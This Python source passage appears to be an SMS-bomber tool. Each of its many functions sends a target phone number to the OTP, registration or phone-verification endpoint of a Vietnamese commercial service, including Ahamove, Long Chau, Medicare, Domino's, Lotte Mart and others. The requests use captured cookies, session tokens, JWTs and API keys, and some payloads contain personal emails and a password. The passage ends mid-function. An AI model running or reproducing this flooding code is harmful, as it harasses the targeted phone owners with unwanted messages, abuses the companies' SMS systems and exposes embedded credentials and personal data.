    'access-token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiI5M2RhNGUwNC00YWIwLTRiMDYtOTc4Ni01NjNlNjY1ZTU5NmIiLCJkaWQiOiI3ODNhMTcyNy02ZDFlLTRjZWMtYmU1OS0zNjViMmU1MWQxN2QiLCJpcCI6IjEuNTIuMTc1LjEzNiIsIm1pZCI6Ik5vbmUiLCJwbHQiOiJ3ZWJ8bW9iaWxlfHdpbmRvd3N8MTB8Y2hyb21lIiwiYXBwX3ZlcnNpb24iOiIyLjAuMCIsImlhdCI6MTcyMDEwNjEwMSwiZXhwIjoxNzM1NjU4MTAxfQ.TzzMuAseNbVYaSuWz5ufu4lEn9Uj_hrxh1aYxHyleJQ',
    'cache-control': 'no-cache',
    # 'content-length': '0',
    'origin': 'https://galaxyplay.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://galaxyplay.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    params = {
    'phone': phone,
}

    response = requests.post('https://api.glxplay.io/account/phone/verify', params=params, headers=headers)
####
def ahamove(sdt):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/json;charset=UTF-8',
    'origin': 'https://app.ahamove.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://app.ahamove.com/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'mobile': phone,
    'name': 'khải',
    'email': 'khaissn@gmail.com',
    'country_code': 'VN',
    'firebase_sms_auth': 'true',
    'time': 1720101304,
    'checksum': 'Ux7gAkb+yFErrq5SsmdmJ8KE31qEen0zSglqznawm5X62j/7LCI+vpgPc7zLxxfpCVrrtQPzKCv5TP0U6pPPa1bjkQT4dF7ta4VDKHqb5fNAkyp9AUkDXexZ7XvsC8qgVWJKHFwj7X5sacNq/LG8yWTuaTP5z+5pLdgzRja8MSPsnX4Sbl2Alps+vm3bc6vZH67c2gA1ScxiZrXotAiwfRgiTH500HJGYz+4h7t6H6r4TXqHQyhPGcUEQUTuW1201w740aVOpx/VvcqBGjLaUWvI6GJJjHGVN1b+EcIc/JnDa068qudt+vfBxBGT6Jt/qcigwxUG9rf0DJvzkbqJfg==',
}

    response = requests.post('https://api.ahamove.com/api/v3/public/user/register', headers=headers, json=json_data)
def lon(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'access-control-allow-origin': '*',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'order-channel': '1',
    'origin': 'https://nhathuoclongchau.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://nhathuoclongchau.com.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-channel': 'EStore',
}

    json_data = {
    'phoneNumber': phone,
    'otpType': 0,
    'fromSys': 'WEBKHLC',
}

    response = requests.post(
    'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification',
    headers=headers,
    json=json_data,
)
def medi(phone):
    cookies = {
    'SERVER': 'nginx3',
    '_gcl_au': '1.1.2035327165.1720297698',
    'XSRF-TOKEN': 'eyJpdiI6Im15a3BJL0ZqODArK0l1VS9FOTFneFE9PSIsInZhbHVlIjoiNDFUelQ3T0lBQmdqbEpmYmxyU29rSStpQ1ZhdUl6UndMSEpHSkJLclRpWnI0c0ZBNDRYQnpHK0kxdGNXcFpMMHFuM0lVZHpmeWNWamtYS1MwdEVYRHQ1THVhZ3Z6amRtMUVkN1ZWTEozV3B5NXJBWmlrZHduUXZPTUg3aW1uemkiLCJtYWMiOiJlYjMzMmQ4N2YzNTQyODAxMWQ2YTYxYjFiYzhhNGMxMmFiMmE3ZTFiMGNkNTYwNDM2MGM3ZDVhZDcyZGJlYTY4IiwidGFnIjoiIn0%3D',
    'medicare_session': 'eyJpdiI6IjBQU2VzVHhNbWVSd0VJcHNMZWxJMHc9PSIsInZhbHVlIjoiUkNEODVKa1c1aHkyeldKMCtkVG5aTVBISVhXdmNYY2tpMktucFBWa2F3Z3UwYkZhMHczRnRSK2c5Ui9PblV4Tzczc1dZQy9GNWJvUktYWTBEd1pWa3dyN3JsRnowQjRRY2hOKzQ4OU1wbDhLOEhHcWcvWDVWeGxTOC9VSkVlZnUiLCJtYWMiOiI0YzFlYWE4NDQ5MGYzZGRmNGVjODQ2ZjBhMDdkZTJjNjFiNGIwMmFhMTYwMTYwOGJjNmUzOTNiMTI5MzUxZjllIiwidGFnIjoiIn0%3D',
    '_ga': 'GA1.2.510182867.1720297701',
    '_gid': 'GA1.2.1839608181.1720297709',
    '_gat_gtag_UA_257373458_1': '1',
    '_fbp': 'fb.1.1720297708926.352505189707594376',
    '_ga_CEMYNHNKQ2': 'GS1.1.1720297700.1.1.1720297727.0.0.0',
    '_ga_8DLTVS911W': 'GS1.1.1720297700.1.1.1720297727.0.0.0',
    '_ga_R7XKMTVGEW': 'GS1.1.1720297700.1.1.1720297727.33.0.0',
}

    headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    # 'Cookie': 'SERVER=nginx3; _gcl_au=1.1.2035327165.1720297698; XSRF-TOKEN=eyJpdiI6Im15a3BJL0ZqODArK0l1VS9FOTFneFE9PSIsInZhbHVlIjoiNDFUelQ3T0lBQmdqbEpmYmxyU29rSStpQ1ZhdUl6UndMSEpHSkJLclRpWnI0c0ZBNDRYQnpHK0kxdGNXcFpMMHFuM0lVZHpmeWNWamtYS1MwdEVYRHQ1THVhZ3Z6amRtMUVkN1ZWTEozV3B5NXJBWmlrZHduUXZPTUg3aW1uemkiLCJtYWMiOiJlYjMzMmQ4N2YzNTQyODAxMWQ2YTYxYjFiYzhhNGMxMmFiMmE3ZTFiMGNkNTYwNDM2MGM3ZDVhZDcyZGJlYTY4IiwidGFnIjoiIn0%3D; medicare_session=eyJpdiI6IjBQU2VzVHhNbWVSd0VJcHNMZWxJMHc9PSIsInZhbHVlIjoiUkNEODVKa1c1aHkyeldKMCtkVG5aTVBISVhXdmNYY2tpMktucFBWa2F3Z3UwYkZhMHczRnRSK2c5Ui9PblV4Tzczc1dZQy9GNWJvUktYWTBEd1pWa3dyN3JsRnowQjRRY2hOKzQ4OU1wbDhLOEhHcWcvWDVWeGxTOC9VSkVlZnUiLCJtYWMiOiI0YzFlYWE4NDQ5MGYzZGRmNGVjODQ2ZjBhMDdkZTJjNjFiNGIwMmFhMTYwMTYwOGJjNmUzOTNiMTI5MzUxZjllIiwidGFnIjoiIn0%3D; _ga=GA1.2.510182867.1720297701; _gid=GA1.2.1839608181.1720297709; _gat_gtag_UA_257373458_1=1; _fbp=fb.1.1720297708926.352505189707594376; _ga_CEMYNHNKQ2=GS1.1.1720297700.1.1.1720297727.0.0.0; _ga_8DLTVS911W=GS1.1.1720297700.1.1.1720297727.0.0.0; _ga_R7XKMTVGEW=GS1.1.1720297700.1.1.1720297727.33.0.0',
    'Origin': 'https://medicare.vn',
    'Pragma': 'no-cache',
    'Referer': 'https://medicare.vn/login',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'X-XSRF-TOKEN': 'eyJpdiI6Im15a3BJL0ZqODArK0l1VS9FOTFneFE9PSIsInZhbHVlIjoiNDFUelQ3T0lBQmdqbEpmYmxyU29rSStpQ1ZhdUl6UndMSEpHSkJLclRpWnI0c0ZBNDRYQnpHK0kxdGNXcFpMMHFuM0lVZHpmeWNWamtYS1MwdEVYRHQ1THVhZ3Z6amRtMUVkN1ZWTEozV3B5NXJBWmlrZHduUXZPTUg3aW1uemkiLCJtYWMiOiJlYjMzMmQ4N2YzNTQyODAxMWQ2YTYxYjFiYzhhNGMxMmFiMmE3ZTFiMGNkNTYwNDM2MGM3ZDVhZDcyZGJlYTY4IiwidGFnIjoiIn0=',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    json_data = {
    'mobile': phone,
    'mobile_country_prefix': '84',
}

    response = requests.post('https://medicare.vn/api/otp', cookies=cookies, headers=headers, json=json_data)
def acfc(phone):
    cookies = {
    '_evga_d955': '{%22uuid%22:%22a93baeb4ee0b4f94%22}',
    '_gcl_gs': '2.1.k1$i1720297927',
    '_gcl_au': '1.1.1109989705.1720297932',
    '_gcl_aw': 'GCL.1720297933.Cj0KCQjw1qO0BhDwARIsANfnkv8mJ0q74DUUs3U7s_VOOT_naF0l0PVGx2vbS_DYa-tHmO_dFuxiIQwaApggEALw_wcB',
    '_ga': 'GA1.1.669040222.1720297933',
    '_sfid_599e': '{%22anonymousId%22:%22a93baeb4ee0b4f94%22%2C%22consents%22:[]}',
    '_tt_enable_cookie': '1',
    '_ttp': 'XkRw_9JIScHjzJOJvMn0bzslTxh',
    'PHPSESSID': 'puf048o1vjsq9933top4t6qhv3',
    'aws-waf-token': '537b5066-8836-44fa-b0bd-72500361bff3:BgoAqZCQRyMOAAAA:y7QyloBvBvA1oTMJqTaA5hHZdTah4qJ7CkCrjDS9+NLmNG1Sfhvhzq1hDBCUfXCfeEZB6FEyWIrMq6s/7Cn79NbkEqfIZtPCpyWr8ImIo70W7O12MJeFN5R1QRXf7BH0oX0cvtwqp/woaxMDXxUajbtxe9ZjVIN1prRIaPCEyeFvKcdw7V9wj4NvwGVyzLwvy4fYpOwWBcZ7ZJQkaRYcK+HUToRSgX/BkOWddqQ5vZYTOvJxohH/Ig==',
    'form_key': 'z6U4dNbxwcokMy9u',
    '_fbp': 'fb.2.1720297944244.46181901986930848',
    'mage-cache-storage': '{}',
    'mage-cache-storage-section-invalidation': '{}',
    'mage-cache-sessid': 'true',
    'recently_viewed_product': '{}',
    'recently_viewed_product_previous': '{}',
    'recently_compared_product': '{}',
    'recently_compared_product_previous': '{}',
    'product_data_storage': '{}',
    'mage-messages': '',
    'optiMonkClientId': 'c6552caa-6bee-d03e-34ca-6d9b47869e59',
    '_ga_PS7MEHMFY3': 'GS1.1.1720297933.1.1.1720297944.49.0.0',
    'optiMonkClient': 'N4IgjArAnGAcUgFygMYEMnAL4BoQDMA3JMAdgCYAGcqUqAFgjwBtjEyqa7G8A7AewAObMFixA===',
    'optiMonkSession': '1720297946',
    'form_key': 'z6U4dNbxwcokMy9u',
}

    headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_evga_d955={%22uuid%22:%22a93baeb4ee0b4f94%22}; _gcl_gs=2.1.k1$i1720297927; _gcl_au=1.1.1109989705.1720297932; _gcl_aw=GCL.1720297933.Cj0KCQjw1qO0BhDwARIsANfnkv8mJ0q74DUUs3U7s_VOOT_naF0l0PVGx2vbS_DYa-tHmO_dFuxiIQwaApggEALw_wcB; _ga=GA1.1.669040222.1720297933; _sfid_599e={%22anonymousId%22:%22a93baeb4ee0b4f94%22%2C%22consents%22:[]}; _tt_enable_cookie=1; _ttp=XkRw_9JIScHjzJOJvMn0bzslTxh; PHPSESSID=puf048o1vjsq9933top4t6qhv3; aws-waf-token=537b5066-8836-44fa-b0bd-72500361bff3:BgoAqZCQRyMOAAAA:y7QyloBvBvA1oTMJqTaA5hHZdTah4qJ7CkCrjDS9+NLmNG1Sfhvhzq1hDBCUfXCfeEZB6FEyWIrMq6s/7Cn79NbkEqfIZtPCpyWr8ImIo70W7O12MJeFN5R1QRXf7BH0oX0cvtwqp/woaxMDXxUajbtxe9ZjVIN1prRIaPCEyeFvKcdw7V9wj4NvwGVyzLwvy4fYpOwWBcZ7ZJQkaRYcK+HUToRSgX/BkOWddqQ5vZYTOvJxohH/Ig==; form_key=z6U4dNbxwcokMy9u; _fbp=fb.2.1720297944244.46181901986930848; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-messages=; optiMonkClientId=c6552caa-6bee-d03e-34ca-6d9b47869e59; _ga_PS7MEHMFY3=GS1.1.1720297933.1.1.1720297944.49.0.0; optiMonkClient=N4IgjArAnGAcUgFygMYEMnAL4BoQDMA3JMAdgCYAGcqUqAFgjwBtjEyqa7G8A7AewAObMFixA===; optiMonkSession=1720297946; form_key=z6U4dNbxwcokMy9u',
    'origin': 'https://www.acfc.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://www.acfc.com.vn/customer/account/create/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'number_phone': phone,
    'form_key': 'z6U4dNbxwcokMy9u',
    'currentUrl': 'https://www.acfc.com.vn/customer/account/create/',
}

    response = requests.post('https://www.acfc.com.vn/mgn_customer/customer/sendOTP', cookies=cookies, headers=headers, data=data)
def lote(phone):
    cookies = {
    '__Host-next-auth.csrf-token': '2c95aedbe3b2a7070c6b91899b2ae8c85931edffbc5f53bf3ceaa177f1a204be%7C5b2082aa598f7c2d9802014b5fabfcd523af03e4738af10baf6ca96063c440b6',
    '__Secure-next-auth.callback-url': 'https%3A%2F%2Fwww.lottemart.vn',
    '_gcl_au': '1.1.2136712951.1720299022',
    '_ga': 'GA1.1.164372556.1720299023',
    '_fbp': 'fb.1.1720299024438.549668172235070425',
    '_ga_6QLJ7DM4XW': 'GS1.1.1720299022.1.1.1720299051.31.0.0',
}

    headers = {
    'accept': 'application/json',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    # 'cookie': '__Host-next-auth.csrf-token=2c95aedbe3b2a7070c6b91899b2ae8c85931edffbc5f53bf3ceaa177f1a204be%7C5b2082aa598f7c2d9802014b5fabfcd523af03e4738af10baf6ca96063c440b6; __Secure-next-auth.callback-url=https%3A%2F%2Fwww.lottemart.vn; _gcl_au=1.1.2136712951.1720299022; _ga=GA1.1.164372556.1720299023; _fbp=fb.1.1720299024438.549668172235070425; _ga_6QLJ7DM4XW=GS1.1.1720299022.1.1.1720299051.31.0.0',
    'origin': 'https://www.lottemart.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://www.lottemart.vn/signup?callbackUrl=https://www.lottemart.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'username': phone,
    'case': 'register',
}

    response = requests.post(
    'https://www.lottemart.vn/v1/p/mart/bos/vi_nsg/V1/mart-sms/sendotp',
    cookies=cookies,
    headers=headers,
    json=json_data,
)
def domi(phone):
    cookies = {
    '_gid': 'GA1.2.1143586587.1720312773',
    '_fbp': 'fb.1.1720312773608.72318382363231927',
    '_gcl_gs': '2.1.k1$i1720312921',
    '_gat_UA-41910789-1': '1',
    '_ga': 'GA1.1.2103093724.1720312773',
    '_ga_12HB7KTL5M': 'GS1.1.1720312772.1.1.1720312932.49.0.0',
    '_ga_8GXKYDTW3R': 'GS1.1.1720312772.1.1.1720312933.0.0.0',
}

    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    # 'cookie': '_gid=GA1.2.1143586587.1720312773; _fbp=fb.1.1720312773608.72318382363231927; _gcl_gs=2.1.k1$i1720312921; _gat_UA-41910789-1=1; _ga=GA1.1.2103093724.1720312773; _ga_12HB7KTL5M=GS1.1.1720312772.1.1.1720312932.49.0.0; _ga_8GXKYDTW3R=GS1.1.1720312772.1.1.1720312933.0.0.0',
    'dmn': 'doqkqr',
    'origin': 'https://dominos.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://dominos.vn/promotion-listing/bogo-week-digital-t7',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'secret': 'bPG0upAJLk0gz/2W1baS2Q==',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'phone_number': phone,
    'email': 'nguyentrongkhai130@gmail.com',
    'type': 0,
    'is_register': True,
}

    response = requests.post('https://dominos.vn/api/v1/users/send-otp', cookies=cookies, headers=headers, json=json_data)
def shop(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'key': '441e8136801b70ac87887bca16dd298f',
    'origin': 'https://thefaceshop.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://thefaceshop.com.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'timestamp': '1720623654086',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'phoneNumber': phone,
}

    response = requests.post(
    'https://tfs-api.hsv-tech.io/client/phone-verification/request-verification',
    headers=headers,
    json=json_data,
)
def fu(phone):
    headers = {
    'accept': 'application/json',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://futabus.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://futabus.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-access-token': 'eyJhbGciOiJSUzI1NiIsImtpZCI6IjU2OTFhMTk1YjI0MjVlMmFlZDYwNjMzZDdjYjE5MDU0MTU2Yjk3N2QiLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImlwIjoiOjoxIiwidXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMTQuMC4wLjAgU2FmYXJpLzUzNy4zNiIsImlzcyI6Imh0dHBzOi8vc2VjdXJldG9rZW4uZ29vZ2xlLmNvbS9mYWNlY2FyLTI5YWU3IiwiYXVkIjoiZmFjZWNhci0yOWFlNyIsImF1dGhfdGltZSI6MTcyMDYyMDYyMywidXNlcl9pZCI6InNFMkk1dkg3TTBhUkhWdVl1QW9QaXByczZKZTIiLCJzdWIiOiJzRTJJNXZIN00wYVJIVnVZdUFvUGlwcnM2SmUyIiwiaWF0IjoxNzIwNjIwNjIzLCJleHAiOjE3MjA2MjQyMjMsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnt9LCJzaWduX2luX3Byb3ZpZGVyIjoiY3VzdG9tIn19.YR8S04KR7mVRqL68o-a-6svQibV5Gpx8ciD-oxmm3zYMYN55FIAzZPkaZ2rlFaNpGwGl5AkuTWgoVVTU5uTttWOADhoWhOMdICkz811oPzQcjVA0VVG2r7Vg6vVOuKdg3jbD6SJ0ySj6Ln96nI-kcy6Q_169sGYxKIGwknsfM91-NnFRi_D_xNulys0i4OxqRdHxpK42VRkzyl0hwj0sS-cd5i84MT8MtiyOZRhn9J89tMLkHVP5NAyDfHtjm3UYmJYbBRQQf-iaT2nu36AZ_dNRT6rtQuqNpk0vyCIEdPo-9t6cKhaW-I69DBcz5d73fleRTM3zHD-5DlJkpkcWKA',
    'x-app-id': 'client',
}

    json_data = {
    'phoneNumber': phone,
    'deviceId': 'e3025fb7-5436-4002-9950-e6564b3656a6',
    'use_for': 'LOGIN',
}

    response = requests.post('https://api.vato.vn/api/authenticate/request_code', headers=headers, json=json_data)
def beau(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'key': '584294d68530c7b753d7f5a77c1ddbc2',
    'origin': 'https://beautybox.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://beautybox.com.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'timestamp': '1720624059192',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'phoneNumber': phone,
}

    response = requests.post(
    'https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification',
    headers=headers,
    json=json_data,
)
def hoanvu(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'key': '028601f79dcc724ef8b8e7c989c5f649',
    'origin': 'https://reebok.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://reebok.com.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'timestamp': '1720624197351',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'phoneNumber': phone,
}

    response = requests.post(
    'https://reebok-api.hsv-tech.io/client/phone-verification/request-verification',
    headers=headers,
    json=json_data,
)
def tokyo(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://tokyolife.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://tokyolife.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'signature': 'c1336d4c72c0b857cdd6aab4de261aa3',
    'timestamp': '1720624468348',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'phone_number': phone,
    'name': 'khải nguyễn',
    'password': 'vjyy1234',
    'email': 'trongkhai1118@gmail.com',
    'birthday': '2002-07-10',
    'gender': 'female',
}

    response = requests.post('https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register', headers=headers, json=json_data)
def cir(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi-VN',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://circa.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://circa.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

    json_data = {
    'phone': {
        'country_code': '84',
        'phone_number': phone,
    },
}

    response = requests.post('https://api.circa.vn/v1/entity/validation-phone', headers=headers, json=json_data)
def guma(phone):
    headers = {
    'Accept': 'application/json',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'Origin': 'https://gumac.vn',
    'Pragma': 'no-cache',
    'Referer': 'https://gumac.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    json_data = {
    'phone': phone,
}

    response = requests.post('https://cms.gumac.vn/api/v1/customers/verify-phone-number', headers=headers, json=json_data)
def hoang(phone):
    cookies = {
    'PHPSESSID': '023c4d0e7b15edc71f14f346ff4ef829',
    'form_key': 'KELcFD4RySb6WQsc',
    'mage-cache-storage': '{}',
    'mage-cache-storage-section-invalidation': '{}',
    'mage-cache-sessid': 'true',
    'mage-messages': '',
    'recently_viewed_product': '{}',
    'recently_viewed_product_previous': '{}',
    'recently_compared_product': '{}',
    'recently_compared_product_previous': '{}',
    'product_data_storage': '{}',
    'form_key': 'KELcFD4RySb6WQsc',
    '_fbp': 'fb.1.1720626061882.764993913589523922',
    '_pk_ses.564990520.6493': '*',
    '_gcl_gs': '2.1.k1$i1720626054',
    '_gcl_au': '1.1.676093199.1720626062',
    'au_id': '1550063352',
    '_ac_au_gt': '1720626058223',
    '_ga': 'GA1.1.42709150.1720626062',
    '_gcl_aw': 'GCL.1720626063.CjwKCAjw4ri0BhAvEiwA8oo6F2MiLFPQwoa8aYSViFa1OyQnHiLIFOvjgAyZ70q6t5zp2PnA6GbquhoCVgMQAvD_BwE',
    'cdp_session': '1',
    '_asm_visitor_type': 'r',
    'mst-cache-warmer-track': '1720626075588',
